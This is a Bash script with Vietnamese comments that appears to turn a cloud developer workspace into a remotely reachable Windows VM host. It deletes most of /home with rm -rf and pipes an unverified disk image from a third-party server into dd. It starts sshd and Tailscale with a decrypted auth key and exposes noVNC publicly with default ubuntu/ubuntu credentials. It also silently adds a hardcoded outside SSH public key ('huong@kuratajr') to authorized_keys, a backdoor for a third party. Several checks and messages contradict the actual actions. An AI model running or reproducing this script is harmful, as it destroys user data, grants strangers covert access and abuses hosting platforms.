#!/bin/bash

echo "Checking qemu-kvm..."
nix-shell -p qemu_kvm --run "qemu-kvm --version" || { echo "Error running qemu-kvm via nix-shell. Exiting..."; exit 1; }

echo "Stopping running VMs..."
ps -eo pid,comm,args | grep '[q]emu-system' | awk '{print $1}' | xargs -r kill -9
killall adb 2>/dev/null || pkill -f adb

echo "Starting cleanup of /home..."
KEEP1="/home/user/myapp/.idx/dev.nix"
KEEP2="/home/check.ok"
KEEP3="/home/run_vm.sh"

CONTAINER_NAME="tailscale"

if [ ! -f "$KEEP2" ]; then
  echo "$KEEP2 does not exist. Proceeding to clean /home (except $KEEP1 and $KEEP3)..."
  [ -f "$KEEP1" ] && cp "$KEEP1" /tmp/dev.nix.backup && echo "Backed up $KEEP1"
  [ -f "$KEEP3" ] && cp "$KEEP3" /tmp/run_vm.sh.backup && echo "Backed up $KEEP3"
  find /home -mindepth 1 -path "$(dirname "$KEEP1")" -prune -o -path "$KEEP3" -prune -o -exec rm -rf {} +
  echo "Cleaned /home except $(dirname "$KEEP1") and $KEEP3"
  [ -f /tmp/dev.nix.backup ] && mkdir -p "$(dirname "$KEEP1")" && cp /tmp/dev.nix.backup "$KEEP1" && echo "Restored $KEEP1"
  [ -f /tmp/run_vm.sh.backup ] && cp /tmp/run_vm.sh.backup "$KEEP3" && chmod +x "$KEEP3" && echo "Restored $KEEP3"
  touch "$KEEP2"
  echo "Created $KEEP2"
else
  echo "$KEEP2 already exists. Skipping cleanup."
fi

echo "Installing necessary packages..."
nix-env -iA nixpkgs.unzip nixpkgs.python3 nixpkgs.git nixpkgs.axel nixpkgs.curl nixpkgs.lsb-release nixpkgs.gnupg nixpkgs.gzip

cd "$(dirname "$0")"

if [ ! -f "noble-server-cloudimg-amd64.img" ]; then
  echo "noble-server-cloudimg-amd64 not found, downloading..."
  cpu_count=$(nproc)
  cpu_name=$(lscpu | grep "Model name" | sed 's/Model name:\s*//')
  ram_total=$(free -h | grep Mem | awk '{print $2}')
  ram_free=$(free -h | grep Mem | awk '{print $4}')
  echo "CPU count: $cpu_count"
  echo "CPU name: $cpu_name"
  echo "Total RAM: $ram_total"
  echo "Free RAM: $ram_free"
  start_time=$(date +%s)
  wget -qO- http://drive.muavps.net/file/Windows2022UEFI.gz | gunzip -c | dd of=/home/windows2022.raw bs=4M &
  pid=$!
  while kill -0 $pid 2>/dev/null; do
    elapsed_time=$(( $(date +%s) - start_time ))
    echo -ne "Installing ${elapsed_time}s \r / 300s "
    sleep 1
  done
  wait $pid
  echo "Installation complete!" || { echo "Error downloading base image"; exit 1; }
else
  echo "Found noble-server-cloudimg-amd64.img"
fi

raw_path=$(realpath "windows2022")
current_size=$(qemu-img info "$raw_path" | grep 'virtual size' | awk '{print $3}' | sed 's/G//')

# if [ "$current_size" -lt 45 ]; then
#   echo "Resizing noble-server-cloudimg-amd64.img to 45G..."
#   qemu-img resize "$raw_path" 46G
# else
#   echo "Image already >= 45G"
# fi

echo "Downloading OVMF.fd from Clear Linux..."
curl -L -o OVMF.fd https://github.com/clearlinux/common/raw/refs/heads/master/OVMF.fd || { echo "Failed to download OVMF.fd"; exit 1; }
chmod 644 ./OVMF.fd

# # Tạo user-data (cloud-init config)
# cat > user-data <<EOF
# #cloud-config
# password: ubuntu
# chpasswd: { expire: False }
# ssh_pwauth: True
# EOF

# # Tạo meta-data và seed.img nếu chưa tồn tại
# if [ ! -f "seed.img" ]; then
#   #HOSTNAME="$WORKSPACE_SLUG"
#   echo "Creating meta-data and seed.img with hostname: $WORKSPACE_SLUG"
#   cat > meta-data <<EOF
# instance-id: id-$WORKSPACE_SLUG
# local-hostname: $WORKSPACE_SLUG
# EOF

#   # Dùng nix-shell để chạy cloud-localds
#   nix-shell -p cloud-utils --run 'cloud-localds seed.img user-data meta-data'
# else
#   echo "seed.img already exists. Skipping creation."
# fi



echo "========================================="
echo "ĐANG CHẠY SCRIPT KHỞI TẠO MÔI TRƯỜNG"
echo "========================================="


echo "Đang tải key cấu hình từ URL..."

# --- [QUAN TRỌNG] THAY URL RAW CỦA BẠN VÀO ĐÂY ---
DECRYPTED_STRING="U2FsdGVkX19i76TO1McWai/GCqc7Fnojgn9oXsN+fSfy3x9R5uWpbB9CDtfY6jkwLisM16O3ykRmwafHJ3t+y/d77Tj2CR42jgH2vrkXoPU=" 


echo "Tải key mới thành công."
NEW_KEY=$(echo "${DECRYPTED_STRING}" | openssl enc -aes-256-cbc -d -base64 -pbkdf2 -pass pass:"${SECRET_PASSWORD}")
# --- 1. CẤU HÌNH BIẾN ---
# Biến cho SSHD (máy chủ)
SSHD_KEY_DIR="$HOME/.ssh/my_sshd_keys"
SSHD_KEY_ED25519="$SSHD_KEY_DIR/ssh_host_ed25519_key"
SSHD_KEY_RSA="$SSHD_KEY_DIR/ssh_host_rsa_key"
SSHD_CMD="$(which sshd) -D -p 22 -h $SSHD_KEY_ED25519 -h $SSHD_KEY_RSA"

# Biến cho SSH (người dùng)
SSH_USER_DIR="$HOME/.ssh"
SSH_USER_KEY_PRIV="$SSH_USER_DIR/id_ed25519"
SSH_USER_KEY_PUB="$SSH_USER_KEY_PRIV.pub"
SSH_AUTH_KEYS="$SSH_USER_DIR/authorized_keys"

# Biến cho Tailscale
TAIL_SOCK="$HOME/.tailscale/tailscaled.sock"
TAIL_STATE_FILE="$HOME/.tailscale/last_used_key.txt"
TAILSCALED_CMD="/home/tailscale/tailscaled --tun=userspace-networking --socket $TAIL_SOCK"
TAILSCALE="/home/tailscale/tailscale"
OLD_KEY=""
if [ -f "$TAIL_STATE_FILE" ]; then
    OLD_KEY=$(cat "$TAIL_STATE_FILE")
fi
# --- 2. KIỂM TRA KEY CHO MÁY CHỦ SSHD ---
echo
echo "--- [Bước 1/6] Kiểm tra SSHD Host Keys ---"
mkdir -p "$SSHD_KEY_DIR"
if [ ! -f "$SSHD_KEY_ED25519" ]; then
    echo "-> Đang tạo key ed25519 cho host..."
    ssh-keygen -t ed25519 -f "$SSHD_KEY_ED25519" -N ""
else
    echo "-> Key ed25519 cho host đã tồn tại."
fi
if [ ! -f "$SSHD_KEY_RSA" ]; then
    echo "-> Đang tạo key rsa cho host..."
    ssh-keygen -t rsa -f "$SSHD_KEY_RSA" -N ""
else
    echo "-> Key rsa cho host đã tồn tại."
fi

# --- 3. KIỂM TRA DỊCH VỤ SSHD ---
echo
echo "--- [Bước 2/6] Kiểm tra dịch vụ SSHD ---"
if ! pgrep -f "$SSHD_CMD" > /dev/null; then
    echo "-> Dịch vụ SSHD (cổng 2222) chưa chạy. Đang khởi động..."
    nohup $SSHD_CMD &
    sleep 1
    if pgrep -f "$SSHD_CMD" > /dev/null; then
        echo "-> Đã khởi động SSHD thành công."
    else
        echo "-> LỖI: Không thể khởi động SSHD. Kiểm tra nohup.out."
    fi
else
    echo "-> Dịch vụ SSHD (cổng 2222) đã chạy."
fi

# --- 4. KIỂM TRA KEY CHO NGƯỜI DÙNG SSH ---
echo
echo "--- [Bước 3/6] Kiểm tra SSH User Keys ---"
mkdir -p "$SSH_USER_DIR"
chmod 755 "$SSH_USER_DIR"
if [ ! -f "$SSH_USER_KEY_PRIV" ]; then
    echo "-> Đang tạo key ed25519 cho user..."
    ssh-keygen -t ed25519 -f "$SSH_USER_KEY_PRIV" -N ""
else
    echo "-> Key ed25519 cho user đã tồn tại."
fi

# --- 5. KIỂM TRA AUTHORIZED_KEYS ---
echo
echo "--- [Bước 4/6] Kiểm tra Authorized Keys ---"
PUB_KEY_CONTENT=$(cat "$SSH_USER_KEY_PUB")
if ! grep -qF "$PUB_KEY_CONTENT" "$SSH_AUTH_KEYS" 2>/dev/null; then
    echo "-> Đang thêm public key của user vào authorized_keys..."
    echo "$PUB_KEY_CONTENT" >> "$SSH_AUTH_KEYS"
    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICnMHnGlA73S1NgKjO8HHMvumPsGdM5TyCvD6KcutDxW huong@kuratajr" >> "$SSH_AUTH_KEYS"
else
    echo "-> Public key của user đã có trong authorized_keys."
fi
chmod 755 "$SSH_USER_DIR"
chmod 600 "$SSH_AUTH_KEYS"
echo "-> Đã đảm bảo quyền 600 cho authorized_keys."

# --- 6. KIỂM TRA DỊCH VỤ TAILSCALED ---
echo
echo "--- [Bước 5/6] Kiểm tra dịch vụ Tailscale ---"
if ! pgrep -f "$TAILSCALED_CMD" > /dev/null; then
    echo "-> Dịch vụ Tailscaled chưa chạy. Đang khởi động..."
    nohup $TAILSCALED_CMD &
    echo "-> Đang chờ socket $TAIL_SOCK..."
    count=0
    while [ ! -S "$TAIL_SOCK" ]; do
        sleep 0.5; count=$((count+1))
        if [ $count -gt 10 ]; then
            echo "-> LỖI: Tailscaled không thể khởi động. Kiểm tra nohup.out."
            break
        fi
    done
else
    echo "-> Dịch vụ Tailscaled đã chạy."
fi

# --- 7. KIỂM TRA VÀ CẬP NHẬT ĐĂNG NHẬP TAILSCALE (LOGIC ĐÃ SỬA LỖI CUỐI CÙNG) ---
echo
echo "--- [Bước 6/6] Kiểm tra và cập nhật đăng nhập Tailscale ---"
if [ ! -S "$TAIL_SOCK" ]; then
    echo "-> LỖI: Không tìm thấy socket Tailscale, không thể kiểm tra."
    exit 1
fi

# Biến để kiểm tra trạng thái đăng nhập hiện tại
IS_LOGGED_IN=true
# if tailscale --socket "$TAIL_SOCK" status > /dev/null 2>&1; then
#     IS_LOGGED_IN=true
# fi

if TS_SOCK="$TAIL_SOCK" $TAILSCALE status 2>&1 | grep -q "Logged out."; then
    # Nếu grep tìm thấy "Logged out." -> thì IS_LOGGED_IN vẫn là false (mặc định)
    IS_LOGGED_IN=false
fi

# SO SÁNH KEY MỚI VÀ KEY CŨ ĐÃ LƯU
if [ "$NEW_KEY" != "$OLD_KEY" ]; then
    echo "-> PHÁT HIỆN KEY MỚI (Key Cũ != Key Mới). Đang chuẩn bị RESET trạng thái."
    
    # **THAY ĐỔI LỚN: XÓA TRẠNG THÁI NGAY LẬP TỨC**
    echo "-> Đang XÓA TRẠNG THÁI (set --reset) và ĐĂNG XUẤT..."
    if $IS_LOGGED_IN; then
        $TAILSCALE --socket "$TAIL_SOCK" logout
    fi
    
    echo "-> Đang ĐĂNG NHẬP bằng key mới từ URL..."
    # Không cần dùng cờ --accept-routes nếu nó đã được lưu trong config, 
    # nhưng chúng ta giữ lại để đảm bảo.
    if $TAILSCALE --socket "$TAIL_SOCK" up --auth-key="$NEW_KEY" --hostname="$WORKSPACE_SLUG" --ssh --accept-routes; then
        echo "-> Đăng nhập thành công! IP mới:"
        $TAILSCALE --socket "$TAIL_SOCK" ip -4
        # LƯU LẠI KEY MỚI VÀO FILE TRẠNG THÁI
        echo "$NEW_KEY" > "$TAIL_STATE_FILE"
    else
        echo "-> LỖI: Đăng nhập với key mới thất bại. Key có thể hết hạn."
    fi

# Key không đổi, nhưng đang ở trạng thái ĐĂNG XUẤT
elif ! $IS_LOGGED_IN; then
    echo "-> Key không đổi, nhưng đang ở trạng thái ĐĂNG XUẤT. Đang cố gắng re-authenticate..."
    
    # KHÔNG CẦN set --reset, chỉ cần up lại để Tailscale thử re-authenticate
    if $TAILSCALE --socket "$TAIL_SOCK" up --auth-key="$NEW_KEY" --ssh --accept-routes; then
        echo "-> Đăng nhập lại thành công! IP hiện tại:"
        $TAILSCALE --socket "$TAIL_SOCK" ip -4
        echo "$NEW_KEY" > "$TAIL_STATE_FILE" 
    else
        echo "-> LỖI: Đăng nhập lại thất bại (Key đã hết hạn). Cần đổi key trên Gist."
    fi

# Key không đổi VÀ đang đăng nhập
else
    echo "-> Key không đổi và Tailscale ĐÃ ĐĂNG NHẬP. Không cần làm gì."
    $TAILSCALE --socket "$TAIL_SOCK" ip -4
fi


echo "========================================="
echo "HOÀN TẤT!"
echo "========================================="

# Lưu thông tin VM
echo "user: ubuntu" > /home/user/myapp/readme.txt
echo "pass: ubuntu" >> /home/user/myapp/readme.txt
echo "script by fb.com/thoai.ngoxuan" >> /home/user/myapp/readme.txt
echo "GZ by kuratajr" >> /home/user/myapp/readme.txt
echo "Init ver 2" >> /home/user/myapp/readme.txt

echo "Starting VM and noVNC..."
nix-shell -p qemu_kvm -p python3 -p git -p novnc --run '
git clone https://github.com/novnc/noVNC.git || true
ln -sf vnc.html ./noVNC/emulator.html
ln -sf vnc.html ./noVNC/index.html
./noVNC/utils/novnc_proxy --vnc localhost:5905 --listen 0.0.0.0:8888 &
VM_NAME="vm"
SLEEP_TIME=15
echo "Bắt đầu giám sát máy ảo: ${VM_NAME}"

while true; do
    STATUS=$(virsh domstate --domain "${VM_NAME}" | tr -d '[:space:]')

    if [ "$STATUS" != "running" ]; then
        echo "$(date): Máy ảo ${VM_NAME} đang ở trạng thái [${STATUS}]. Khởi động lại..."

        virsh start "${VM_NAME}"

        if [ $? -eq 0 ]; then
            echo "$(date): Khởi động VM thành công."
        else
            echo "$(date): LỖI: Không thể khởi động VM. Kiểm tra log libvirt!"
            # Nếu khởi động lỗi, chờ lâu hơn trước khi thử lại
            sleep 60
        fi
    else
        echo "$(date): Máy ảo ${VM_NAME} đang chạy ổn định."
    fi
    
    sleep ${SLEEP_TIME}
done
'
